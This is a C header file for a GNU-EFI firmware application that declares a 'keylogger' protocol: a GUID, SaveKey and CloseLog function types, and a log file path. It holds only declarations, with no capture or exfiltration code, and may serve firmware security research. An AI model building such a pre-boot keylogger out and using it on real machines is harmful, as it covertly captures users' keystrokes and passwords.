#ifndef _GNU_EFI_APPS_KEYLOGGER_H_
#define _GNU_EFI_APPS_KEYLOGGER_H_

#ifdef __cplusplus
extern "C" {
#endif

/* UEFI naming conventions */
#define GNU_EFI_APPS_KEYLOGGER_PROTOCOL_GUID \
{ 0xe4dcafd0, 0x586c, 0x4b3d, {0x86, 0xe7, 0x28, 0xde, 0x7f, 0xcc, 0x04, 0xb9} }

INTERFACE_DECL(_GNU_EFI_APPS_KEYLOGGER_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *GNU_EFI_APPS_KEYLOGGER_SAVE_KEY) (
    IN const CHAR16 Key
    );

typedef
EFI_STATUS
(EFIAPI *GNU_EFI_APPS_KEYLOGGER_CLOSE_LOG) ();

typedef struct _GNU_EFI_APPS_KEYLOGGER_PROTOCOL {
  GNU_EFI_APPS_KEYLOGGER_SAVE_KEY           SaveKey;
  GNU_EFI_APPS_KEYLOGGER_CLOSE_LOG CloseLog;
} GNU_EFI_APPS_KEYLOGGER_PROTOCOL;

#define LOGFILE L"\\log.txt"

#ifdef __cplusplus
}
#endif

#endif
